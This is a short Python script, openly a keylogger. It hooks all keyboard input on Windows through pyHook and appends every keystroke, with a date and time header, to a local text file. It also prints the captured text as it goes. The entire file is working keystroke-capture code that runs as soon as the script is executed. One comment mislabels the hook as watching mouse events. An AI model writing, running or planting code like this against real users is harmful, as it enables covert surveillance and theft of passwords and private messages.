def KeyLogger(logName,logTime):
    import pythoncom, pyHook

    def getKey(recievedKey):
        key = str(recievedKey).lower();
        if (key=="space"):
            key = " ";
        if(key=="back"):
            key = "<";
        if(key=="oem_period"):
            key = ".";
        if (key == "return"):
            key = "\n";
        return key;

    global logTxt,logFile;
    logTxt = '';
    logName += ".txt"
    logFile = open(logName,'a');
    logFile.write("\n\n=====" + logTime + "=====\n\n")
    logFile.close();

    def OnKeyboardEvent(event):
        global logTxt, logFile;
        key =getKey(event.Key)
        logTxt += key;
        #print ('Key:', event.Key)

        #Every 20 chars, we write to log
        if len(logTxt)>20:
            print(logTxt);
            logFile = open(logName,'a')
            logFile.write(logTxt)
            logFile.close();
            logTxt ='';

    # return True to pass the event to other handlers
        return True
    # create a hook manager
    hm = pyHook.HookManager()
    # watch for all mouse events
    hm.KeyDown = OnKeyboardEvent
    # set the hook
    hm.HookKeyboard()
    # wait forever

    pythoncom.PumpMessages()
    return True;

import _datetime as dt
now= dt.datetime.now()
KeyLogger(str(dt.date.today()),str(dt.time(now.hour,now.minute,now.second)));
